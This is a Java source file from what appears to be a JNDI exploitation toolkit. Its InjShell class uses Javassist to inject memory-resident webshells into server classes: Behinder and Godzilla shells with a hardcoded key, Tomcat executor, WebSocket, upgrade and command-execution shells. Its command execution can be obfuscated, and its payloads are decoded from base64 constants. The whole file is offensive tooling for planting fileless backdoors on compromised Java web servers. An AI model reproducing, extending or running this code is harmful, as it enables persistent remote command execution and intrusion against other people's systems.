package com.nu1r.jndi.gadgets.utils;

import javassist.*;

import java.util.Arrays;
import java.util.List;

import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
import static com.nu1r.jndi.template.shell.MemShellPayloads.*;
import static com.nu1r.jndi.utils.Config.*;

public class InjShell {
    public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {

        // 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
        String name = ctClass.getName();
        name = name.substring(name.lastIndexOf(".") + 1);
        boolean isTomcat = name.startsWith("T");

        // 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
        String method = "";

        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
        classes.add(ctClass.getSuperclass());

        for (CtClass value : classes) {
            String className = value.getName();
            if (KEY_METHOD_MAP.containsKey(className)) {
                method = KEY_METHOD_MAP.get(className);
                break;
            }
        }

        CtClass supClass = ctClass.getSuperclass();
        if (supClass != null && supClass.getName().equals("org.apache.tomcat.util.threads.ThreadPoolExecutor")) {
            method = "execute";
            isTomcat = false;
        }

        switch (type) {
            // 冰蝎类型的内存马
            case "bx":
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));

                if (isTomcat) {
                    insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL_FOR_TOMCAT));
                } else {
                    insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL));
                }
                break;
            // 哥斯拉类型的内存马
            case "gz":
                insertField(ctClass, "payload", "Class payload ;");
                insertField(ctClass, "xc", "String xc = \"7ff9fe91aaa7d3aa\";");

                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(MD5), ctClass));
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));

                insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL));
                break;
            // 哥斯拉 raw 类型的内存马
            case "gzraw":
                insertField(ctClass, "payload", "Class payload ;");
                insertField(ctClass, "xc", "String xc = \"7ff9fe91aaa7d3aa\";");

                ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));

                insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL));
                break;
//			// Tomcat Executor cmd 执行内存马
            case "execute":
                ctClass.addField(CtField.make("public static String TAG = \"nu1r\";", ctClass));
                insertCMD(ctClass);
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_REQUEST), ctClass));
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_RESPONSE), ctClass));

                insertMethod(ctClass, method, Utils.base64Decode(EXECUTOR_SHELL));
                break;
            // websocket cmd 执行内存马
            case "ws":
                insertCMD(ctClass);
                insertMethod(ctClass, method, Utils.base64Decode(WS_SHELL));
                break;
            case "upgrade":
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
                insertCMD(ctClass);
                insertMethod(ctClass, method, Utils.base64Decode(UPGRADE_SHELL));
                break;
            // 命令执行回显内存马
            case "cmd":
            default:
                insertCMD(ctClass);

                if (isTomcat) {
                    insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_TOMCAT));
                } else {
                    insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL));
                }

                break;
        }

        insertField(ctClass, "pattern", "public static String pattern = \"" + URL_PATTERN + "\";");

    }

    public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
        // 根据传入的不同参数，在不同方法中插入不同的逻辑
        CtMethod cm = ctClass.getDeclaredMethod(method);
        cm.setBody(payload);
    }

    /**
     * 向指定类中写入命令执行方法 execCmd
     * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
     *
     * @param ctClass 指定类
     * @throws Exception 抛出异常
     */
    public static void insertCMD(CtClass ctClass) throws Exception {

        if (IS_OBSCURE) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
            try {
                ctClass.getDeclaredMethod("getFieldValue");
            } catch (NotFoundException e) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
            }
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD_OBSCURE), ctClass));
        } else {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD), ctClass));
        }
    }

    public static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
        ctClass.defrost();
        try {
            CtField ctSUID = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(ctSUID);
        } catch (javassist.NotFoundException ignored) {
        }
        ctClass.addField(CtField.make(fieldCode, ctClass));
    }
}
